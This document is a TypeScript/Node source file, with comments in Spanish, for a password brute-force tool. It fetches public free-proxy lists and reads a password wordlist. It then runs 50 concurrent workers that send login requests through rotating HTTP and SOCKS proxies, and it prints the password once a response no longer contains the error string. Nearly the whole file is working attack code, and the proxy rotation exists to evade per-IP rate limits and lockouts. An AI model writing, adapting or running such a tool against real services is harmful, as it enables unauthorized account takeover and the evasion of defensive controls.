//-------------importaciones--------------
import fetch from 'node-fetch'
import yargs from 'yargs'
import {hideBin} from 'yargs/helpers'
import { HttpProxyAgent } from 'http-proxy-agent';
import fs from 'fs'
import { SocksProxyAgent } from 'socks-proxy-agent'

//-------------declaración de variables--------------------


//subrama1: yargs:

const yarg= yargs(hideBin(process.argv))
.option("url",{demandOption:false,type:"string"}).option("n",{type:"number",demandOption:false}).option("header",{type:"string"})
.option("body",{type:"string"})
.option("method",{type:"string"})
.option("wordlist",{type:"string",default:"/usr/share/seclists/Discovery/Web-Content/common.txt"})
.option("error",{type:"string",default:"error"}).parseSync()

let url= yarg.url || "http://api.ipify.org?format=json"
let header= yarg.header || "application/json"

let body="password:"
if(yarg.body){body=yarg.body}
let method= yarg.method || "GET"

//subrama2: wordlists:

let wordlist_de_proxies:any=await fetch("https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.json").then(function(data){return data.json()})

let wordlist_de_proxieshttps:any=await fetch("https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/https/data.json").then(function(data){return data.json()});

let wordlists_http:any= await fetch("https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json&protocol=http").then(function(data){return data.json()})

let wordlist_httptrue:any= wordlists_http.proxies

let wordlist_passwords= fs.readFileSync(yarg.wordlist!).toString().split("\n")

wordlist_de_proxies= [...wordlist_de_proxies,...wordlist_de_proxieshttps,...wordlist_httptrue]



console.log("numero de proxies:",wordlist_de_proxies.length)

//variables globales:

let peticiones=0
let i=0

let numero_de_peticiones_por_ip= yarg.n || 1

console.log("num:",numero_de_peticiones_por_ip)
let workers=[]


let proxies_en_uso:any=[]


let siguiente=0

let siguiente_password=0

let contraseña_encontrada:boolean=false

//---------------declaración de funciones------------------

async function bruteForce(agent:any){let a=0
    while(a<numero_de_peticiones_por_ip){
       await fetch(url,{method:method,headers:{"Content-Type":header},agent:agent, signal: AbortSignal.timeout(10000) }).then(function(data){return data.json()}).then(function(data:any){ 
        console.log("tu ip::",data); ++peticiones;
         console.log("peticiones:",peticiones);
         return}).catch(function(){console.log("error")})
       ++a
}}

async function bruteForcebody(agent:any){let a=0
    while(a<numero_de_peticiones_por_ip && siguiente_password<wordlist_passwords.length){
        let password=siguiente_password;
        ++siguiente_password
       
       await fetch(url,{method:method,headers:{"Content-Type":header},body:JSON.stringify({body:wordlist_passwords[password]}),agent:agent, signal: AbortSignal.timeout(10000) }).then(function(data){return data.json()}).then(function(data:any){

         if( data.message && !data.message.includes(yarg.error)){ ++peticiones;
            console.log("la contraseña es:",wordlist_passwords[password]);
             contraseña_encontrada=true; 
             a=numero_de_peticiones_por_ip +1}

         console.log("peticiones:",peticiones);
         return}).catch(function(){
            console.log("error")})
       ++a
}}


//--------------codigo--------------------

while(i<=49){
    

 workers.push((async function worker(){
            while(siguiente < wordlist_de_proxies.length && contraseña_encontrada===false){
            let proxy=wordlist_de_proxies[siguiente]
            
            let agent:any= ""; if(proxy.protocol==="http"){agent=new HttpProxyAgent(  proxy.proxy ); console.log("este es un http")}
            else{ agent= new SocksProxyAgent(proxy.proxy); console.log("este es un socks")}
          
            ; ++siguiente
             
             if( !proxies_en_uso.includes(proxy.proxy)){

            try{
                proxies_en_uso.push(proxy.proxy); 

         if(method==="GET"){   await bruteForce(agent)} else{await bruteForcebody(agent)}

            }catch{console.log("error fuera del then")}
      
        }
         
   
    }})())
            ++i; 
  
}




//-----------------código----------------------

await Promise.all(workers)

console.log("fin"); console.log("numero de peticiones finales:",siguiente)

process.exit()
